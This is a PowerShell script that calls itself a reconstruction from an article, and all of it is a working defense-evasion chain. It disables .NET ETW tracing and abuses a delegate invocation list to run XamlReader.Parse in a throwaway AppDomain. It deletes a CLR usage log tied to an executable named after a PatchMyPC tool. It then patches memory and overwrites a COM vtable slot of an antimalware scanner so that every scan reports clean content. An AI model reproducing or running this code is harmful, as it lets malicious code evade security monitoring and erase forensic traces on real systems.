# Equivalent API operations reconstructed from the article; never executed.
[Environment]::SetEnvironmentVariable('COMPlus_ETWEnabled', '0')
$callback = [System.CrossAppDomainDelegate][System.TimeZoneInfo]::ClearCachedData
$combined = [Delegate]::Combine($callback, $callback)
$field = [System.MulticastDelegate].GetField('_invocationList', [Reflection.BindingFlags]'Instance,NonPublic')
$list = $field.GetValue($combined)
$list[1] = [Delegate]::CreateDelegate([Func[string,object]], [System.Windows.Markup.XamlReader].GetMethod('Parse', [type[]]@([string])))
$field.SetValue($combined, $list)
$isolated = [AppDomain]::CreateDomain([Guid]::NewGuid().ToString())
$isolated.DoCallBack($combined)
[AppDomain]::Unload($isolated)
[IO.File]::Delete([Environment]::ExpandEnvironmentVariables('%LOCALAPPDATA%\Microsoft\CLR_v4.0\UsageLogs\PatchMyPC-ScriptRunner.exe.log'))

Add-Type @'
using System;
using System.Runtime.InteropServices;
public static class PageAccess {
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr p, UIntPtr n, uint flags, out uint old);
}
'@
if ([IntPtr]::Size -eq 8) {
    $scanner = [Activator]::CreateInstance([type]::GetTypeFromCLSID([Guid]'fdb00e52-a214-4aa1-8fba-4357bb0072ec'))
    $replacement = [Action][Console]::Clear
    $target = $replacement.Method.MethodHandle.GetFunctionPointer()
    [byte[]]$clean = 0x41,0xc7,0x00,0x01,0x00,0x00,0x00,0x33,0xc0,0xc3
    [uint32]$previous = 0
    [uint32]$ignored = 0
    [PageAccess]::VirtualProtect($target, [UIntPtr]$clean.Length, 0x40, [ref]$previous)
    [Runtime.InteropServices.Marshal]::Copy($clean, 0, $target, $clean.Length)
    [PageAccess]::VirtualProtect($target, [UIntPtr]$clean.Length, $previous, [ref]$ignored)
    $instance = [Runtime.InteropServices.Marshal]::GetIUnknownForObject($scanner)
    $table = [Runtime.InteropServices.Marshal]::ReadIntPtr($instance)
    $slot = [IntPtr]::Add($table, 0x18)
    [PageAccess]::VirtualProtect($slot, [UIntPtr][IntPtr]::Size, 0x04, [ref]$previous)
    [Runtime.InteropServices.Marshal]::WriteIntPtr($slot, $target)
    [PageAccess]::VirtualProtect($slot, [UIntPtr][IntPtr]::Size, $previous, [ref]$ignored)
    [Runtime.InteropServices.Marshal]::Release($instance)
}
